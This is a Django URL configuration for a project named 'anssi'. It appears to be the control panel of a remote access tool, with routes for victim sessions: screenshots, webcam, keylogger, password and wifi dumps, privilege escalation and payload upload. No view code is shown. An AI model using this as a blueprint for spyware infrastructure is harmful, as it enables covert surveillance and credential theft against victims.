"""anssi URL Configuration

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/1.11/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  url(r'^$', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  url(r'^$', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.conf.urls import url, include
    2. Add a URL to urlpatterns:  url(r'^blog/', include('blog.urls'))
"""
from django.conf.urls import url
from django.contrib import admin
from django.conf import settings
from django.conf.urls.static import static
from django.contrib.staticfiles.urls import staticfiles_urlpatterns
from server import views


urlpatterns = [
    url(r'^admin/', admin.site.urls),
    url(r'^sessions$', views.sessions, name="sessions"),
    url(r'^sessions/(\d+)/?$', views.session, name="session"),
    url(r'^sessions/(\d+)/session_close$', views.session_close, name="session_close"),
    url(r'^sessions/(\d+)/session_information$', views.session_information, name="session_information"),
    url(r'^sessions/(\d+)/session_explorer$', views.session_explorer, name="session_explorer"),
    url(r'^sessions/(\d+)/session_screenshot$', views.session_screenshot, name="session_screenshot"),
    url(r'^sessions/(\d+)/action_screenshot$', views.action_screenshot, name="action_screenshot"),
    url(r'^sessions/(\d+)/session_webcam$', views.session_webcam, name="session_webcam"),
    url(r'^sessions/(\d+)/action_webcam$', views.action_webcam, name="action_webcam"),
    url(r'^sessions/(\d+)/session_live$', views.session_live, name="session_live"),
    url(r'^sessions/(\d+)/session_keylogger$', views.session_keylogger, name="session_keylogger"),
    url(r'^sessions/(\d+)/session_passwords$', views.session_passwords, name="session_passwords"),
    url(r'^sessions/(\d+)/session_passwords_async$', views.session_passwords_async, name="session_passwords_async"),
    url(r'^sessions/(\d+)/session_wifi_list$', views.session_wifi_list, name="session_wifi_list"),
    url(r'^sessions/(\d+)/session_wifi_list_async$', views.session_wifi_list_async, name="session_wifi_list_async"),
    url(r'^sessions/(\d+)/session_getadmin$', views.session_getadmin, name="session_getadmin"),
    url(r'^upload_payload$', views.upload_payload, name="upload_payload"),
    url(r'^jobs/init$', views.init, name="init"),
    url(r'^jobs/init_worker$', views.init_worker, name="init_worker"),
    url(r'^jobs$', views.jobs, name="jobs"),
    url(r'^jobs/(\d+)/kill', views.jobs_kill, name="jobs_kill"),
    url(r'^ready$', views.ready, name="ready"),
    url(r'^about$', views.about, name="about"),
    url(r'^$', views.home, name="home"),
    url(r'^remote$', views.remote, name="remote"),
]

urlpatterns += staticfiles_urlpatterns()
urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
